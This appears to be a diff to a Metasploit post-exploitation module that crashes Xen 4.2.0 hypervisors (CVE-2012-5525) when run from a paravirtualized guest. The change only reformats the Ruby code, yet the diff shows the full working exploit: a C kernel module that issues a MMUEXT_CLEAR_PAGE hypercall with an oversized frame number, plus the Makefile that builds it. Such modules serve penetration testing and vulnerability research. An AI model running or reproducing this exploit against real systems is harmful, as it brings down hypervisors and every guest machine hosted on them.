@@ -12,17 +12,20 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name'         => 'Linux DoS Xen 4.2.0 2012-5525',
-        'Description'  => %q(
-        This module causes a hypervisor crash in Xen 4.2.0 when invoked from a
-        paravirtualized VM, including from dom0.  Successfully tested on Debian 7
-        3.2.0-4-amd64 with Xen 4.2.0.),
-        'References'   => [ ['CVE', '2012-5525'] ],
-        'License'      => MSF_LICENSE,
-        'Author'       => [ 'Christoph Sendner <christoph.sendner[at]stud-mail.uni-wuerzburg.de>',
-                            'Aleksandar Milenkoski  <aleksandar.milenkoski[at]uni-wuerzburg.de>'],
-        'Platform'     => [ 'linux' ],
-        'Arch'         => [ARCH_X64],
+        'Name' => 'Linux DoS Xen 4.2.0 2012-5525',
+        'Description' => %q{
+          This module causes a hypervisor crash in Xen 4.2.0 when invoked from a
+          paravirtualized VM, including from dom0.  Successfully tested on Debian 7
+          3.2.0-4-amd64 with Xen 4.2.0.
+        },
+        'References' => [ ['CVE', '2012-5525'] ],
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Christoph Sendner <christoph.sendner[at]stud-mail.uni-wuerzburg.de>',
+          'Aleksandar Milenkoski  <aleksandar.milenkoski[at]uni-wuerzburg.de>'
+        ],
+        'Platform' => [ 'linux' ],
+        'Arch' => [ARCH_X64],
         'SessionTypes' => ['shell']
       )
     )
@@ -225,16 +228,16 @@ class MetasploitModule < Msf::Post
   ##
 
   def make_code
-    m = <<-END
-obj-m := #{@c_name}.o
+    m = <<~END
+      obj-m := #{@c_name}.o
 
-EXTRA_CFLAGS+= -save-temps
+      EXTRA_CFLAGS+= -save-temps
 
-all:
-\t$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+      all:
+      \t$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 
-clean:
-\t$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+      clean:
+      \t$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
     END
     m
   end
@@ -246,28 +249,28 @@ clean:
   ##
 
   def c_code
-    c = <<-END
-#undef __KERNEL__
-#define __KERNEL__
-#undef MODULE
-#define MODULE
-#include <linux/module.h>
-#include <asm/xen/hypercall.h>
-MODULE_LICENSE("GPL");
-static int __init lkm_init(void)
-{
-struct mmuext_op op;
-int status;
-op.cmd = 16; /*MMUEXT_CLEAR_PAGE*/
-op.arg1.mfn = 0x0EEEEE; /*A large enough MFN*/
-HYPERVISOR_mmuext_op(&op, 1, &status, DOMID_SELF);
-return 0;
-}
-static void __exit lkm_cleanup(void)
-{
-}
-module_init(lkm_init);
-module_exit(lkm_cleanup);
+    c = <<~END
+      #undef __KERNEL__
+      #define __KERNEL__
+      #undef MODULE
+      #define MODULE
+      #include <linux/module.h>
+      #include <asm/xen/hypercall.h>
+      MODULE_LICENSE("GPL");
+      static int __init lkm_init(void)
+      {
+      struct mmuext_op op;
+      int status;
+      op.cmd = 16; /*MMUEXT_CLEAR_PAGE*/
+      op.arg1.mfn = 0x0EEEEE; /*A large enough MFN*/
+      HYPERVISOR_mmuext_op(&op, 1, &status, DOMID_SELF);
+      return 0;
+      }
+      static void __exit lkm_cleanup(void)
+      {
+      }
+      module_init(lkm_init);
+      module_exit(lkm_cleanup);
     END
     c
   end
